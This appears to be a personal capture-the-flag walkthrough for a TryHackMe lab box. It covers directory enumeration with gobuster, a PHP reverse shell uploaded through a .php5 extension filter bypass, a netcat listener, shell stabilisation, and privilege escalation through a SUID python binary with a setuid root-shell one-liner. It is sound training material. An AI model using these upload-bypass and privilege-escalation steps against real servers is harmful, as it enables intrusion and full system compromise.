SCANNING: DIRECTORIES.
Since gobuster is explicitly required:
gobuster dir -u http://10.10.97.208:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
OUTPUT:
/uploads              (Status: 301) [Size: 314] [--> http://10.10.97.208/uploads/]

(FAILED) EXPLOITATION 2: PLANNING.
We'll try to stick our php to a jpg.


(FAILED) EXPLOITATION 2: EXECUTION.
Add image to jpg:
cat totally_normal_image.jpg revphp.php > shell.jpg
Note:
nc failed to catch a shell, even though upload seems successful.




EXPLOITATION 3: RECON.
Curl to check if server supports php:
curl -I http://10.10.39.243:80

EXPLOITATION 3: EXECUTION.
Note:
Previous attempt worked. I just missed some steps. 
Trying again, we will use a .php file with .php5 extension, which seems to bypass upload filters.

Listener on attacker:
nc -lvnp 1234

Note: 
With gobuster, we found the /uploads directory. We visit said link and click the .php5 shell to start the shell.

Stabilize shell:
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg
export TERM=xterm

Find flag:
find . -name "user.txt" 2>/dev/null
OUTPUT:
./var/www/user.txt

Cat flag:
cat ./var/www/user.txt
OUTPUT:
THM{y0u_g0t_a_sh3ll}




PRIVESC: RECON.
As requested, check SUID (Set User ID) permissions on files:
ls -l
INTERESTING OUTPUT:
/usr/bin/python


PRIVESC: EXECUTION.
We simply run python and execute a root shel directly:
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'

Flag:
cat root/root.txt
OUTPUT:
THM{pr1v1l3g3_3sc4l4t10n}
